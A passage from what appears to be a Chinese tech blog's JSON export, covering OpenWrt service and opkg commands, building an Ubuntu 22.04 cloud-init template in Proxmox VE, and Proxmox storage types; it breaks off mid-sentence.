System V 的典型风格。当然，还有最高优先级的<code>/etc/inittab</code>脚本。</p>\n<p>OpenWrt 的系统服务管理命令：</p>\n<ul>\n<li><p><code>service</code>：显示系统服务列表，包括服务名称、初始状态、运行状态</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Usage: service &lt;service&gt; [command]</span><br><span class=\"line\">/etc/init.d/boot                   enabled     stopped</span><br><span class=\"line\">/etc/init.d/cron                   enabled     stopped</span><br><span class=\"line\">/etc/init.d/dnsmasq                enabled     running</span><br><span class=\"line\">/etc/init.d/log                    enabled     running</span><br><span class=\"line\">/etc/init.d/network                enabled     running</span><br><span class=\"line\">/etc/init.d/sysctl                 enabled     stopped</span><br><span class=\"line\">/etc/init.d/system                 enabled     stopped</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>service &lt;service&gt; [command]</code>：对某个 serive 执行操作：</p>\n  <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Available commands:</span><br><span class=\"line\">    start           Start the service</span><br><span class=\"line\">    stop            Stop the service</span><br><span class=\"line\">    restart         Restart the service</span><br><span class=\"line\">    reload          Reload configuration files (or restart if service does not implement reload)</span><br><span class=\"line\">    enable          Enable service autostart</span><br><span class=\"line\">    disable         Disable service autostart</span><br><span class=\"line\">    enabled         Check if service is started on boot</span><br><span class=\"line\">    running         Check if service is running</span><br><span class=\"line\">    status          Service status</span><br><span class=\"line\">    trace           Start with syscall trace</span><br><span class=\"line\">    info            Dump procd service info</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"附录二：opkg-常用命令\"><a href=\"#附录二：opkg-常用命令\" class=\"headerlink\" title=\"附录二：opkg 常用命令\"></a>附录二：opkg 常用命令</h2><p>opkg 环境的配置目录：<code>/etc/opkg.conf</code><br>opkg 源的配置目录：<code>/etc/opkg/</code>，具体内容为：</p>\n<ul>\n<li><code>distfeeds.conf</code> ：默认软件源的路径，指向 <a href=\"https://downloads.openwrt.org/releases/23.05.3/packages/x86_64\">https://downloads.openwrt.org</a></li>\n<li><code>customfeeds.conf</code>：用户软件源，初始为空。</li>\n<li><code>keys/</code>：用于密钥管理</li>\n</ul>\n<p>opkg 常用命令：</p>\n<ul>\n<li>opkg update：更新可以获取的软件包列表</li>\n<li>opkg upgrade：对已经安装的软件包升级</li>\n<li>opkg list：获取软件列表</li>\n<li>opkg list installed：获取已安装的软件列表</li>\n<li>opkg install &lt; pkg &gt;：安装指定的软件包</li>\n<li>opkg remove &lt; pkg &gt;：卸载已经安装的指定的软件包</li>\n<li>opkg info &lt; pkg &gt;：获取某个软件包的完整信息，例如底层依赖</li>\n<li>opkg files &lt; pkg&gt;：获取某个软件包的文件清单</li>\n</ul>\n<h2 id=\"附录三：瑞士军刀-busybox\"><a href=\"#附录三：瑞士军刀-busybox\" class=\"headerlink\" title=\"附录三：瑞士军刀 busybox\"></a>附录三：瑞士军刀 busybox</h2><p>BusyBox 被称为“嵌入式 Linux 的瑞士军刀”，设计目标就是在单一的可执行文件（不超过一张软盘）中提供精简的 Unix 工具集（200+ 应用程序），可运行于多款 POSIX 环境的操作系统。<br>查看 OpenWrt 的应用目录<code>\\bin</code>，可以发现大部分的操作系统常用命令都是 busybox 提供的。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">-rwxr-xr-x    1 root     root        405522 Mar 23  2024 busybox</span><br><span class=\"line\">lrwxrwxrwx    1 root     root             7 Mar 23  2024 cat -&gt; busybox</span><br><span class=\"line\">lrwxrwxrwx    1 root     root             7 Mar 23  2024 cp -&gt; busybox</span><br><span class=\"line\">lrwxrwxrwx    1 root     root             7 Mar 23  2024 login -&gt; busybox</span><br><span class=\"line\">lrwxrwxrwx    1 root     root             7 Mar 23  2024 ls -&gt; busybox</span><br><span class=\"line\">-rwxr-xr-x    1 root     root        155131 Mar 23  2024 opkg</span><br><span class=\"line\">lrwxrwxrwx    1 root     root             7 Mar 23  2024 passwd -&gt; busybox</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h2><ul>\n<li><a href=\"https://downloads.openwrt.org/releases/\">OpenWrt 历史版本清单</a></li>\n<li><a href=\"https://downloads.openwrt.org/releases/23.05.3/targets/x86/64\">OpenWrt 系统镜像下载</a></li>\n<li><a href=\"https://mirror-03.infra.openwrt.org/releases/23.05.3/packages/x86_64/\">OpenWrt 软件源目录</a></li>\n<li><a href=\"https://openwrt.org/zh/docs/guide-user/base-system/uci\">OpenWrt UCI 介绍</a></li>\n<li><a href=\"https://openwrt.org/docs/guide-user/services/ntp/client-server\">NTP client &#x2F; NTP server</a></li>\n</ul>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.barhe.org/archives/1234\">如何在 PVE 上安装一个官方版的 Openwrt</a></li>\n<li><a href=\"https://blog.csdn.net/qq_35718410/article/details/53113894\">uci命令系统详解</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/436450556\">Linux overlayfs文件系统介绍</a></li>\n<li><a href=\"https://cn.linux-console.net/?p=10009\">OverlayFS简介</a></li>\n<li><a href=\"https://sspai.com/post/68511\">Openwrt 作为旁路网关（不是旁路由、单臂路由）的终极设置方法</a></li>\n</ul>\n"},{"title":"Proxmox VE 配置 Ubuntu 虚拟机的操作记录","url":"/2024/12/29/Proxmox-VE-%E9%85%8D%E7%BD%AE-Ubuntu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/","content":"<p>随着 CentOS 正式退出市场，许多软件的在线更新出现错误，Canonical 公司的 Ubuntu 的替代价值越来越明显，许多 AI 大模型的开发工作都是基于 Ubuntu，为此考虑为PVE 服务器增加 Ubuntu 的虚拟机模版。<br>Ubuntu 是基于 Debian 的开源发行版，与红帽的 Centos 软件包存在许多差异，而由于其通常用于桌面系统，软件包比较庞杂，作为服务器需要仔细进行剪裁。</p>\n<p>Ubuntu 的主版本号就是其<strong>首次发布的年份</strong>，还有一个带形容词的动物别名，其生命周期通常为5年。</p>\n<ul>\n<li>Ubuntu 24.04.1 LTS（Noble Numbat，高贵的袋鼠）：最新版本，从稳定性角度暂不考虑</li>\n<li>Ubuntu 18.04 LTS（Bionic Beaver，仿生海狸）：常规支持已于2023年5月31日结束</li>\n<li>Ubuntu 20.04 LTS（Focal Fossa，马岛长尾狸猫）：2025年就要结束常规维护周期，算了。。。</li>\n<li>Ubuntu 22.04 LTS（Jammy Jellyfish，幸运水母）：就是幸运的你了！</li>\n</ul>\n<p>Ubuntu 官方提供了 ISO 格式的发行版，分为桌面版、服务器版和用于物联网的 IoT 版，此外还有一种为云计算提供的 Cloud 镜像版（就是基于 Cloud-init 的 IMG 格式的基线版本），适配了几乎所有主流云计算厂商，当然也可以用于私人定制。</p>\n<p>根据<a href=\"https://cloud-images.ubuntu.com/releases/\">Ubuntu Cloud Images</a>的信息，Ubuntu 22.04 经历多次补丁升级，最新版本发布于2024年12月17日。<br>最终确下载文件是 x86 架构镜像：<a href=\"https://cloud-images.ubuntu.com/releases/22.04/release-20241217/ubuntu-22.04-server-cloudimg-amd64.img\">ubuntu-22.04-server-cloudimg-amd64.img</a>，组件信息参见<a href=\"https://cloud-images.ubuntu.com/releases/22.04/release-20241217/ubuntu-22.04-server-cloudimg-amd64.manifest\">manifest文件</a>。</p>\n<h2 id=\"1-新建虚拟机\"><a href=\"#1-新建虚拟机\" class=\"headerlink\" title=\"1. 新建虚拟机\"></a>1. 新建虚拟机</h2><p>在 PVE 中新建一个 VM，基本配置包括：</p>\n<ul>\n<li>VM 命名为<code>ubuntu22</code>，这里要记住<code>VM ID</code>！</li>\n<li>CDROM 无需加载任何介质，因为不再使用 ISO 镜像文件，而是后续直接导入 IMG 镜像文件</li>\n<li><strong>勾选<code>Qemu Agent</code>参数</strong>，便于后续安装<code>qemu-guest-agent</code>，可以通过 PVE 控制台执行开关机等操作</li>\n<li>硬盘默认设置即可，反正后面要删除！</li>\n<li>处理器建议 1C，内存建议 1G；网络默认<code>vmbr0</code>即可，注意<strong>取消<code>Firewall</code>防火墙</strong></li>\n</ul>\n<h2 id=\"2-导入镜像文件\"><a href=\"#2-导入镜像文件\" class=\"headerlink\" title=\"2. 导入镜像文件\"></a>2. 导入镜像文件</h2><p>登录 PVE 主机。可以直接在 PVE 控制台的 node 节点执行 Shell 操作，默认就是 root 用户。</p>\n<ul>\n<li><code>wget</code>网络下载 IMG 文件，并存储在用户目录（可以建个子目录）</li>\n<li>使用<code>qm importdisk &lt;vmid&gt; &lt;source&gt; &lt;storage&gt;</code>命令，挂载到 VM 作为新增磁盘设备。默认存储路径是<code>local-lvm</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~/cloud-img# qm importdisk 701 ubuntu-22.04-server-cloudimg-amd64.img local-lvm</span><br><span class=\"line\">importing disk &#x27;ubuntu-22.04-server-cloudimg-amd64.img&#x27; to VM 701 ...</span><br><span class=\"line\">  WARNING: You have not turned on protection against thin pools running out of space.</span><br><span class=\"line\">  WARNING: Set activation/thin_pool_autoextend_threshold below 100 to trigger automatic extension of thin pools before they get full.</span><br><span class=\"line\">  Logical volume &quot;vm-701-disk-1&quot; created.</span><br><span class=\"line\">  WARNING: Sum of all thin volume sizes (&lt;696.70 GiB) exceeds the size of thin pool pve/data and the size of whole volume group (&lt;476.44 GiB).</span><br><span class=\"line\">transferred: 0 bytes remaining: 2361393152 bytes total: 2361393152 bytes progression: 0.00 %</span><br><span class=\"line\">transferred: 23613931 bytes remaining: 2337779221 bytes total: 2361393152 bytes progression: 1.00 %</span><br><span class=\"line\">transferred: 47464002 bytes remaining: 2313929150 bytes total: 2361393152 bytes progression: 2.01 %</span><br><span class=\"line\">。。。</span><br><span class=\"line\">transferred: 2331167319 bytes remaining: 30225833 bytes total: 2361393152 bytes progression: 98.72 %</span><br><span class=\"line\">transferred: 2354781251 bytes remaining: 6611901 bytes total: 2361393152 bytes progression: 99.72 %</span><br><span class=\"line\">transferred: 2361393152 bytes remaining: 0 bytes total: 2361393152 bytes progression: 100.00 %</span><br><span class=\"line\">transferred: 2361393152 bytes remaining: 0 bytes total: 2361393152 bytes progression: 100.00 %</span><br><span class=\"line\">Successfully imported disk as &#x27;unused0:local-lvm:vm-701-disk-1&#x27;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-配置虚拟机\"><a href=\"#3-配置虚拟机\" class=\"headerlink\" title=\"3. 配置虚拟机\"></a>3. 配置虚拟机</h2><p>对该 VM 的<code>hardware</code>标签页面进行配置:</p>\n<ul>\n<li>发现新设备<code>Unused Disk 0</code>，Add 该设备后发现尺寸大约 2.25GB，这就是我们手工加载的镜像文件。<br>  适当增加磁盘空间以便后续系统软件安装，但空间过多会占用磁盘并延缓启动速度，建议增加 2GB 即可</li>\n<li>Remove 默认的<code>CDROM</code>；Detach &amp; Remove 默认的磁盘<code>Hard disk(scsi0)</code></li>\n<li>Add 一个 Cloudinit 设备（类型是CDROM），默认存储路径也是<code>local-lvm</code></li>\n</ul>\n<p>处理结果就是这个样子<br><img src=\"/2024/12/29/Proxmox-VE-%E9%85%8D%E7%BD%AE-Ubuntu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/pic01.png\" alt=\"VM\"></p>\n<h2 id=\"4-配置cloudinit\"><a href=\"#4-配置cloudinit\" class=\"headerlink\" title=\"4. 配置cloudinit\"></a>4. 配置cloudinit</h2><p>对该 VM 的<code>Cloud-init</code>标签页面进行配置:</p>\n<ul>\n<li>User：设置默认用户<code>ubuntu</code>。注意，Ubuntu 默认不直接使用<code>root</code>，而是将默认用户赋予<code>sudo</code>权限</li>\n<li>Password：<strong>建议设置</strong>。Ubuntu 默认不允许密码远程登录，只有 PVE Console 可以密码登录。</li>\n<li>DNS domain &amp; DNS server：默认 host 配置即可，后续可以自定义</li>\n<li>SSH public key：编辑录入（多个）指定设备的公钥。以后维护均通过 SSH 远程免密登录。</li>\n<li>IP Config(eth0)：当前采用 DHCP，后续可以自定义</li>\n</ul>\n<p>处理结果就是这个样子<br><img src=\"/2024/12/29/Proxmox-VE-%E9%85%8D%E7%BD%AE-Ubuntu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/pic02.png\" alt=\"VM\"></p>\n<blockquote>\n<p>如果不设置默认用户的密码，虽然可以从指定设备 SSH 免密登录，但初次启动采用 DHCP 方式 IP 地址不固定，而 Qemu Agent 尚未安装也无法在 PVE 查看 IP 地址，因此最好还是设置一下。</p>\n</blockquote>\n<h2 id=\"5-启动测试\"><a href=\"#5-启动测试\" class=\"headerlink\" title=\"5. 启动测试\"></a>5. 启动测试</h2><p>注意！！！由于修改了磁盘配置，必须在<code>Options</code>标签页面的<code>Boot Order</code>项检查 VM 的启动配置，确保内置硬盘是第一启动顺序，否则 VM 无法启动就白费了！</p>\n<p><img src=\"/2024/12/29/Proxmox-VE-%E9%85%8D%E7%BD%AE-Ubuntu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/pic03.png\" alt=\"VM\"></p>\n<p>如果检查无误，就可以启动 VM 了，通过 PVE Console 可以查看启动日志。<br>通过 PVE Console 进行密码登录，并使用<code>ip a</code>命令查看 IP 地址，现在可以在指定设备使用 SSH 免密登录了。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">buntu@ubuntu22:~$ systemctl status</span><br><span class=\"line\">● ubuntu22</span><br><span class=\"line\">    State: running</span><br><span class=\"line\">     Jobs: 0 queued</span><br><span class=\"line\">   Failed: 0 units</span><br><span class=\"line\">    Since: Sun 2024-12-29 13:48:24 UTC; 23min ago</span><br><span class=\"line\">   CGroup: /</span><br><span class=\"line\">           ├─user.slice </span><br><span class=\"line\">           │ └─user-1000.slice </span><br><span class=\"line\">           │   ├─user@1000.service </span><br><span class=\"line\">           │   │ └─init.scope </span><br><span class=\"line\">           │   │   ├─1617 /lib/systemd/systemd --user</span><br><span class=\"line\">           │   │   └─1618 (sd-pam)</span><br><span class=\"line\">           │   ├─session-3.scope </span><br><span class=\"line\">           │   │ ├─7117 sshd: ubuntu [priv]</span><br><span class=\"line\">           │   │ ├─7174 sshd: ubuntu@pts/0</span><br><span class=\"line\">           │   │ ├─7175 -bash</span><br><span class=\"line\">           │   │ ├─7204 systemctl status</span><br><span class=\"line\">           │   │ └─7205 pager</span><br><span class=\"line\">           │   └─session-1.scope </span><br><span class=\"line\">           │     ├─ 712 /bin/login -p --</span><br><span class=\"line\">           │     └─1626 -bash</span><br><span class=\"line\">           ├─init.scope </span><br><span class=\"line\">           │ └─1 /sbin/init</span><br><span class=\"line\">           └─system.slice </span><br><span class=\"line\">             ├─packagekit.service                       # 为软件安装提供统一的 DBus 接口</span><br><span class=\"line\">             │ └─1654 /usr/libexec/packagekitd</span><br><span class=\"line\">             ├─systemd-networkd.service </span><br><span class=\"line\">             │ └─527 /lib/systemd/systemd-networkd</span><br><span class=\"line\">             ├─systemd-udevd.service </span><br><span class=\"line\">             │ └─369 /lib/systemd/systemd-udevd</span><br><span class=\"line\">             ├─cron.service </span><br><span class=\"line\">             │ └─650 /usr/sbin/cron -f -P</span><br><span class=\"line\">             ├─polkit.service </span><br><span class=\"line\">             │ └─764 /usr/libexec/polkitd --no-debug</span><br><span class=\"line\">             ├─networkd-dispatcher.service </span><br><span class=\"line\">             │ └─659 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers</span><br><span class=\"line\">             ├─multipathd.service                       # 多路径存储设备管理</span><br><span class=\"line\">             │ └─365 /sbin/multipathd -d -s</span><br><span class=\"line\">             ├─systemd-journald.service </span><br><span class=\"line\">             │ └─328 /lib/systemd/systemd-journald</span><br><span class=\"line\">             ├─unattended-upgrades.service              # Ubuntu 系统升级服务</span><br><span class=\"line\">             │ └─729 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal</span><br><span class=\"line\">             ├─ssh.service </span><br><span class=\"line\">             │ └─807 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span><br><span class=\"line\">             ├─snapd.service                            # Ubuntu 应用商店服务</span><br><span class=\"line\">             │ └─663 /usr/lib/snapd/snapd</span><br><span class=\"line\">             ├─rsyslog.service </span><br><span class=\"line\">             │ └─2063 /usr/sbin/rsyslogd -n -iNONE</span><br><span class=\"line\">             ├─systemd-resolved.service </span><br><span class=\"line\">             │ └─529 /lib/systemd/systemd-resolved</span><br><span class=\"line\">             ├─dbus.service </span><br><span class=\"line\">             │ └─652 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span><br><span class=\"line\">             ├─systemd-timesyncd.service </span><br><span class=\"line\">             │ └─474 /lib/systemd/systemd-timesyncd</span><br><span class=\"line\">             └─systemd-logind.service </span><br><span class=\"line\">               └─664 /lib/systemd/systemd-logind</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"6-生成模版\"><a href=\"#6-生成模版\" class=\"headerlink\" title=\"6. 生成模版\"></a>6. 生成模版</h2><h3 id=\"安装-Qemu-guest-agent\"><a href=\"#安装-Qemu-guest-agent\" class=\"headerlink\" title=\"安装 Qemu-guest-agent\"></a>安装 Qemu-guest-agent</h3><p>Qemu-guest-agent 用于 PVE 管理虚拟机，例如控制台开关机、显示 IP 地址等监控信息。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install -y qemu-guest-agent</span><br><span class=\"line\">sudo systemctl start qemu-guest-agent</span><br><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>GA 安装必须通过 PVE Console，因为 SSH 远程登录无法显示字符 UI 界面将导致安装失败！<br>安装过程中提示，内核需要从<code>5.15.0-127-generic</code>升级为<code>5.15.0-130-generic</code>，重启<code>packagekit.service</code>服务后，使用<code>uname -r</code>命令，查看内核版本升级成功</p>\n</blockquote>\n<h3 id=\"设置中国时区-常用软件包\"><a href=\"#设置中国时区-常用软件包\" class=\"headerlink\" title=\"设置中国时区 + 常用软件包\"></a>设置中国时区 + 常用软件包</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo timedatectl set-timezone Asia/Shanghai</span><br><span class=\"line\">sudo apt install net-tools</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"模版制作\"><a href=\"#模版制作\" class=\"headerlink\" title=\"模版制作\"></a>模版制作</h3><p>现在关闭 VM，随后将 VM 转换为模版固定下来，以后就可以克隆小鸡了！</p>\n<hr>\n<h2 id=\"附录：APT（Advanced-Packaging-Tool）简介\"><a href=\"#附录：APT（Advanced-Packaging-Tool）简介\" class=\"headerlink\" title=\"附录：APT（Advanced Packaging Tool）简介\"></a>附录：APT（Advanced Packaging Tool）简介</h2><p>Debian 系发行版，包括 Ubuntu、Linux Mint 和 elementary OS 等，采用了 Debian 包管理系统，使用<code>.deb</code>文件来管理软件包。</p>\n<ul>\n<li><code>dpkg</code> 是 Debian 包管理系统的核心，直接负责操作<code>.deb</code>文件，包含了<code>dpkg-split</code>、<code>dpkg-trigger</code>和<code>dpkg-divert</code>等一组命令，这些命令会也被<code>apt</code>和<code>apt-get</code>等更高级的工具调用。</li>\n<li><code>apt-get</code>和<code>apt-cache</code>是比较<strong>古早</strong>的命令行工具，用于与包管理系统交互。其以稳定可靠著称，经常用于自动化任务，比如 Shell 脚本当中。</li>\n<li>2014 年之后，<code>apt</code>取代<code>apt-get</code>成为所有基于 Debian 的 Linux 发行版的默认软件包管理器工具。它整合了 apt-get 和 apt-cache 的功能，语法更简单，输出也更友好，比如带有进度条和颜色编码。</li>\n</ul>\n<p>apt 的软件源配置文件位于：<code>/etc/apt/sources.list</code>，核心内容如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy main restricted</span><br><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy-updates main restricted</span><br><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy universe</span><br><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy-updates universe</span><br><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy multiverse</span><br><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy-updates multiverse</span><br><span class=\"line\">deb http://archive.ubuntu.com/ubuntu jammy-backports main restricted universe multiverse</span><br><span class=\"line\">deb http://security.ubuntu.com/ubuntu jammy-security main restricted</span><br><span class=\"line\">deb http://security.ubuntu.com/ubuntu jammy-security universe</span><br><span class=\"line\">deb http://security.ubuntu.com/ubuntu jammy-security multiverse</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"系统管理\"><a href=\"#系统管理\" class=\"headerlink\" title=\"系统管理\"></a>系统管理</h3><ul>\n<li><code>sudo apt-get update</code> ：更新 apt 软件源的索引信息</li>\n<li><code>sudo apt-get upgrade</code> ：更新所有已安装软件的最新版本</li>\n<li><code>sudo apt-get dist-upgrade</code>：升级系统</li>\n<li><code>sudo apt-get clean &amp; sudo apt-get autoclean</code>：清理无用的包</li>\n<li><code>sudo apt-get check</code> ：检查是否有损坏的包依赖</li>\n</ul>\n<h3 id=\"安装和卸载\"><a href=\"#安装和卸载\" class=\"headerlink\" title=\"安装和卸载\"></a>安装和卸载</h3><ul>\n<li><code>sudo apt-get install &lt;package&gt;=&lt;version&gt;</code> ：安装指定版本的软件包</li>\n<li><code>sudo apt-get remove &lt;package&gt;</code>：删除软件包</li>\n</ul>\n<h3 id=\"检索分析\"><a href=\"#检索分析\" class=\"headerlink\" title=\"检索分析\"></a>检索分析</h3><ul>\n<li><code>sudo apt-get list</code>：显示所有可用的软件包</li>\n<li><code>sudo apt-get list --installed</code>：显示当前已安装的软件包</li>\n<li><code>sudo apt-get source &lt;package&gt;</code>：下载该软件包的源代码</li>\n<li><code>sudo apt-cache search &lt;package&gt;</code>： 搜索包</li>\n<li><code>sudo apt-cache show &lt;package&gt;</code> ：获取包的相关信息，如说明，大小，版本。</li>\n<li><code>sudo apt-cache depends &lt;package&gt;</code> ：分析某个软件包的依赖关系</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://blog.csdn.net/zhengmx100/article/details/78352773\">Ubuntu 各版本代号简介</a></li>\n<li><a href=\"https://github.com/UntouchedWagons/Ubuntu-CloudInit-Docs\">Making a Ubuntu 24.04 VM Template for Proxmox and CloudInit</a></li>\n<li><a href=\"https://never666.uk/2107/\">在 PVE 8 中使用 Cloud-init 初始化 ubuntu cloud-image 并创建模板</a></li>\n<li><a href=\"https://itan90.cn/archives/174/\">在 PVE 8 环境中制作 Ubuntu 的 Cloud Init虚拟机模板</a></li>\n<li><a href=\"https://www.oryoy.com/news/ubuntu-server-zui-xiao-hua-an-zhuang-zhi-nan-you-hua-xi-tong-zi-yuan-yu-ti-sheng-bian-cheng-huan-jin.html\">Ubuntu Server最小化安装指南</a></li>\n<li><a href=\"https://cn.linux-console.net/?p=33717#google_vignette\">如何使用自动安装编写和执行 Ubuntu 无人值守安装</a></li>\n<li><a href=\"https://5long.github.io/post/packagekit.html\">无用的知识：PackageKit</a></li>\n<li><a href=\"https://www.cnblogs.com/laina/articles/17674155.html\">ubuntu22.04通过netplan配置网络</a></li>\n<li><a href=\"https://juejin.cn/post/7028510908175351816\">APT、apt-get、apt-cache 和 apt</a></li>\n</ul>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://cn.ubuntu.com/\">Ubuntu 官方主页</a></li>\n<li><a href=\"https://cloud-images.ubuntu.com/releases/\">Ubuntu Cloud Images 发布版下载</a></li>\n<li><a href=\"https://cloudinit.readthedocs.io/en/stable/index.html\">Cloud-init documentation</a></li>\n<li><a href=\"https://pve.proxmox.com/wiki/Cloud-Init_Support\">Proxmax Cloud-Init Support</a></li>\n</ul>\n"},{"title":"Proxmox-VE的存储管理小结","url":"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/","content":"<h2 id=\"一、PVE存储的性质类型（Storage-Properties）\"><a href=\"#一、PVE存储的性质类型（Storage-Properties）\" class=\"headerlink\" title=\"一、PVE存储的性质类型（Storage Properties）\"></a>一、PVE存储的性质类型（Storage Properties）</h2><p>PVE需要管理的存储资源，分为以下6种，分别用于不同类型的数据持久化。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">标识符</th>\n<th align=\"left\">类型</th>\n<th align=\"left\">特性说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">iso</td>\n<td align=\"left\">安装盘</td>\n<td align=\"left\">ISO images，包括Centos、Ubuntu等操作系统的安装镜像文件，也可以是Win7安装盘</td>\n</tr>\n<tr>\n<td align=\"center\">vztmpl</td>\n<td align=\"left\">模版文件</td>\n<td align=\"left\">Container templates，LXC的模版文件，仅支持Linunx类型</td>\n</tr>\n<tr>\n<td align=\"center\">rootdir</td>\n<td align=\"left\">根系统</td>\n<td align=\"left\">Allow to store container data.用于VM或LXC的系统盘</td>\n</tr>\n<tr>\n<td align=\"center\">images</td>\n<td align=\"left\">虚拟磁盘</td>\n<td align=\"left\">KVM-Qemu VM images，一般用于数据盘，VM或LXC均可挂载，文件格式或者LV块设备均可以</td>\n</tr>\n<tr>\n<td align=\"center\">backup</td>\n<td align=\"left\">备份文件</td>\n<td align=\"left\">Backup files (vzdump).VM或LXC均可以使用，通常是文件格式</td>\n</tr>\n<tr>\n<td align=\"center\">snippets</td>\n<td align=\"left\">快照文件</td>\n<td align=\"left\">Snippet files, for example guest hook scripts，VM或LXC快照文件</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、PVE存储的设备类型（Storage-Types）\"><a href=\"#二、PVE存储的设备类型（Storage-Types）\" class=\"headerlink\" title=\"二、PVE存储的设备类型（Storage Types）\"></a>二、PVE存储的设备类型（Storage Types）</h2><p>与通常的UNIX系统一样，Proxmox VE支持基于POSIX的文件系统存储和基于RAW裸设备的块存储设备。<br>裸设备一般建在LV上，没有filesystem，因此无法支持iso、vztmpl、backup，但可以支持rootdir、image。</p>\n<p>各种存储方式的特性见下表。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/proxmox-storage-types.png\" class=\"\">\n\n<blockquote>\n<p>1: 绝大部分文件系统本身不支持快照功能。如果要创建虚拟机快照，只能利用 qcow2 文件格式自带的快照功能。<br>2: 如果后端存储是FC光纤存储设备，或是iSCSI存储设备，LVM方式可以提供共享资源。</p>\n</blockquote>\n<p>下面介绍几个最重要的存储类型：</p>\n<h3 id=\"1-目录（Directory）\"><a href=\"#1-目录（Directory）\" class=\"headerlink\" title=\"1. 目录（Directory）\"></a>1. 目录（Directory）</h3><p>Proxmox VE 可以使用本地目录或挂载在本地文件系统的共享存储作为存储服务。<br>目录是文件系统级的存储服务，你可以保存任何类型的数据，包括虚拟机镜像，容器，模板， ISO 镜像或虚拟机备份文件。<br>PVE初始安装生成的<code>local</code>存储就是<code>Directory</code>属性，其路径是<code>/var/lib/vz</code>。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/shot2.png\" class=\"\">\n\n<p>可以看到，其中<code>dump</code>目录存储的就是备份文件，<code>template</code>目录存储的就是VM模版和LXC模版。</p>\n<h3 id=\"2-逻辑卷（LVM）\"><a href=\"#2-逻辑卷（LVM）\" class=\"headerlink\" title=\"2.逻辑卷（LVM）\"></a>2.逻辑卷（LVM）</h3><p>LVM 是典型的块存储解决方案，但 LVM 后端存储本身不支持快照和链接克隆功能。更不幸的是，在创建普通 LVM 快照期间，整个卷组的写操作都会受到影响而变得非常低效。</p>\n<blockquote>\n<p>LVM最大的好处是你可以在共享存储上建立 LVM 后端存储服务。例如可以在 iSCSI LUN 上建立 LVM。LVM 后端存储自带 Proxmox VE 集群锁以有效防止并发访问冲突。</p>\n</blockquote>\n<p>LVM的创建包含了以下步骤： Device -&gt; Partition -&gt; Phycial Volume -&gt; Volume Group -&gt; Login Volume，具体步骤参见附录1。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/shot4.png\" class=\"\">\n\n<h3 id=\"3-薄模式的逻辑卷（LVM-thin）\"><a href=\"#3-薄模式的逻辑卷（LVM-thin）\" class=\"headerlink\" title=\"3. 薄模式的逻辑卷（LVM-thin）\"></a>3. 薄模式的逻辑卷（LVM-thin）</h3><p>LVM 是在逻辑卷创建时就按设置的卷容量大小预先分配所需空间。LVM-thin 存储池是在向 卷内写入数据时按实际写入数据量大小分配所需空间。LVM-thin 所用的存储空间分配方式允许创建容量远大于物理存储空间的存储卷，因此也称为“薄模式”。</p>\n<blockquote>\n<p>注意：LVM-thin 